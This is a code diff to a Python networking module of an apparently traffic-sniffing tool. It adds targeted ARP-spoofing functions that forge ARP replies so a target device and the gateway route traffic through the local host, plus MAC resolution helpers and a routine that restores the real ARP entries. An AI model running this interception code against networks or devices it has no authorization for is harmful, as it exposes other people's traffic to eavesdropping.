@@ -7,11 +7,14 @@ frames and resolving IP addresses to MAC addresses using the Windows `iphlpapi.d
 import ctypes
 import socket
 import struct
+import time
 from ctypes import wintypes
+from dataclasses import dataclass
 from typing import TYPE_CHECKING
 
 from session_sniffer.capture.exceptions import ArpResolutionError
 from session_sniffer.logging_setup import get_logger
+from session_sniffer.networking.ctypes_adapters_info import iterate_ipv4_neighbors
 
 if TYPE_CHECKING:
     from session_sniffer.capture.pcap import PcapHandle
@@ -29,6 +32,16 @@ _ETHERTYPE_ARP = 0x0806
 _BROADCAST_MAC = b'\xff\xff\xff\xff\xff\xff'
 
 
+@dataclass(frozen=True, slots=True)
+class ArpSpoofTargets:
+    """Target device and gateway address pairing for ARP spoofing."""
+
+    target_ip: str
+    target_mac: str
+    gateway_ip: str
+    gateway_mac: str
+
+
 def _mac_string_to_bytes(mac_string: str) -> bytes:
     """Convert a MAC address string (e.g. `AA:BB:CC:DD:EE:FF`) to 6 raw bytes."""
     return bytes(int(octet, 16) for octet in mac_string.replace('-', ':').split(':'))
@@ -39,11 +52,12 @@ def _mac_bytes_to_string(mac_bytes: bytes) -> str:
     return ':'.join(f'{byte:02x}' for byte in mac_bytes)
 
 
-def resolve_mac_address(ip_address: str) -> str:
+def resolve_mac_address(ip_address: str, source_ip: str | None = None) -> str:
     """Resolve an IPv4 address to its MAC address using the Windows SendARP API.
 
     Args:
         ip_address: The target IPv4 address to resolve.
+        source_ip: Optional source IPv4 address of the local adapter to query from.
 
     Returns:
         The resolved MAC address as a colon-separated hex string.
@@ -52,25 +66,55 @@ def resolve_mac_address(ip_address: str) -> str:
         ArpResolutionError: If the MAC address cannot be resolved.
     """
     try:
-        destination_ip = wintypes.DWORD(struct.unpack('!I', socket.inet_aton(ip_address))[0])
+        destination_ip = wintypes.DWORD(struct.unpack('<I', socket.inet_aton(ip_address))[0])
     except OSError as exception:
         raise ArpResolutionError(ip_address, f'Invalid IP address: {exception}') from exception
 
-    mac_address_buffer = (ctypes.c_ubyte * 6)()
+    source_ip_dword = wintypes.DWORD(0)
+    if source_ip is not None:
+        try:
+            source_ip_dword = wintypes.DWORD(struct.unpack('<I', socket.inet_aton(source_ip))[0])
+        except OSError:
+            source_ip_dword = wintypes.DWORD(0)
+
+    # Allocate 8 bytes for physical address buffer as mandated by MSDN (at least two ULONGs)
+    mac_address_buffer = (ctypes.c_ubyte * 8)()
     mac_address_length = wintypes.DWORD(6)
 
     iphlpapi = ctypes.windll.iphlpapi
-    result = iphlpapi.SendARP(
-        destination_ip,
-        wintypes.DWORD(0),
-        ctypes.byref(mac_address_buffer),
-        ctypes.byref(mac_address_length),
-    )
+    iphlpapi.SendARP.argtypes = [
+        wintypes.DWORD,
+        wintypes.DWORD,
+        ctypes.c_void_p,
+        ctypes.POINTER(wintypes.DWORD),
+    ]
+    iphlpapi.SendARP.restype = wintypes.DWORD
 
-    if result:
-        raise ArpResolutionError(ip_address, f'SendARP returned error code {result}')
+    last_error_code = 0
+    for attempt in range(3):
+        mac_address_length.value = 6
+        result = iphlpapi.SendARP(
+            destination_ip,
+            source_ip_dword,
+            ctypes.byref(mac_address_buffer),
+            ctypes.byref(mac_address_length),
+        )
+        if result == 0:
+            return _mac_bytes_to_string(bytes(mac_address_buffer[:6]))
 
-    return _mac_bytes_to_string(bytes(mac_address_buffer))
+        last_error_code = result
+        # If source_ip_dword was non-zero and failed, try falling back to 0 on subsequent attempts
+        if source_ip_dword.value != 0 and attempt == 0:
+            source_ip_dword = wintypes.DWORD(0)
+        time.sleep(0.2)
+
+    # Fallback to local ARP cache if SendARP was unable to resolve
+    for _interface_index, cached_ip, cached_mac in iterate_ipv4_neighbors():
+        if cached_ip == ip_address and cached_mac and cached_mac.upper() not in {'00:00:00:00:00:00', 'FF:FF:FF:FF:FF:FF'}:
+            logger.debug('Found %s in Windows neighbor cache: %s', ip_address, cached_mac)
+            return cached_mac.lower()
+
+    raise ArpResolutionError(ip_address, f'SendARP returned error code {last_error_code}')
 
 
 def build_arp_reply(
@@ -123,43 +167,76 @@ def build_arp_reply(
 
 def send_arp_spoof_packets(
     pcap_handle: PcapHandle,
-    interface_mac: str,
-    interface_ip: str,
-    gateway_ip: str,
-    gateway_mac: str,
+    host_mac: str,
+    targets: ArpSpoofTargets,
 ) -> None:
-    """Send a pair of spoofed ARP replies to redirect traffic through this host.
+    """Send spoofed ARP replies to redirect traffic through this host.
 
-    Sends two ARP reply frames:
-    1. To the gateway: claiming that `interface_ip` is at `interface_mac`
-       (so the gateway sends traffic destined for `interface_ip` to this host)
-    2. To the target (broadcast): claiming that `gateway_ip` is at `interface_mac`
-       (so other devices send traffic destined for the gateway to this host)
+    Sends two targeted ARP reply frames:
+    1. To the gateway: claiming that `targets.target_ip` is at `host_mac`
+       (so the gateway sends traffic destined for `targets.target_ip` to this host)
+    2. To the target: claiming that `targets.gateway_ip` is at `host_mac`
+       (so the target sends traffic destined for the gateway to this host)
 
     Args:
         pcap_handle: An open pcap handle on the target interface.
-        interface_mac: MAC address of the local interface (the spoofing host).
-        interface_ip: IP address of the local interface.
-        gateway_ip: IP address of the gateway to impersonate.
-        gateway_mac: MAC address of the gateway.
+        host_mac: MAC address of the local interface (the spoofing PC).
+        targets: Target device and gateway address pairing.
     """
-    local_mac_bytes = _mac_string_to_bytes(interface_mac)
-    gateway_mac_bytes = _mac_string_to_bytes(gateway_mac)
+    host_mac_bytes = _mac_string_to_bytes(host_mac)
+    target_mac_bytes = _mac_string_to_bytes(targets.target_mac)
+    gateway_mac_bytes = _mac_string_to_bytes(targets.gateway_mac)
 
-    # Tell the gateway: "interface_ip is at local_mac"
+    # Tell the gateway: "target_ip is at host_mac"
     frame_to_gateway = build_arp_reply(
-        sender_mac=local_mac_bytes,
-        sender_ip=interface_ip,
+        sender_mac=host_mac_bytes,
+        sender_ip=targets.target_ip,
         target_mac=gateway_mac_bytes,
-        target_ip=gateway_ip,
+        target_ip=targets.gateway_ip,
     )
     pcap_handle.send_packet(frame_to_gateway)
 
-    # Broadcast to network: "gateway_ip is at local_mac"
-    frame_to_network = build_arp_reply(
-        sender_mac=local_mac_bytes,
-        sender_ip=gateway_ip,
-        target_mac=_BROADCAST_MAC,
-        target_ip='255.255.255.255',
+    # Tell the target device: "gateway_ip is at host_mac"
+    frame_to_target = build_arp_reply(
+        sender_mac=host_mac_bytes,
+        sender_ip=targets.gateway_ip,
+        target_mac=target_mac_bytes,
+        target_ip=targets.target_ip,
     )
-    pcap_handle.send_packet(frame_to_network)
+    pcap_handle.send_packet(frame_to_target)
+
+
+def send_arp_restore_packets(
+    pcap_handle: PcapHandle,
+    targets: ArpSpoofTargets,
+    repeat_count: int = 3,
+) -> None:
+    """Send genuine ARP replies to restore normal routing between target and gateway.
+
+    Args:
+        pcap_handle: An open pcap handle on the target interface.
+        targets: Target device and gateway address pairing.
+        repeat_count: Number of times to send each restore frame.
+    """
+    target_mac_bytes = _mac_string_to_bytes(targets.target_mac)
+    gateway_mac_bytes = _mac_string_to_bytes(targets.gateway_mac)
+
+    # Restore gateway ARP table: "target_ip is at target_mac"
+    frame_to_gateway = build_arp_reply(
+        sender_mac=target_mac_bytes,
+        sender_ip=targets.target_ip,
+        target_mac=gateway_mac_bytes,
+        target_ip=targets.gateway_ip,
+    )
+
+    # Restore target ARP table: "gateway_ip is at gateway_mac"
+    frame_to_target = build_arp_reply(
+        sender_mac=gateway_mac_bytes,
+        sender_ip=targets.gateway_ip,
+        target_mac=target_mac_bytes,
+        target_ip=targets.target_ip,
+    )
+
+    for _ in range(repeat_count):
+        pcap_handle.send_packet(frame_to_gateway)
+        pcap_handle.send_packet(frame_to_target)
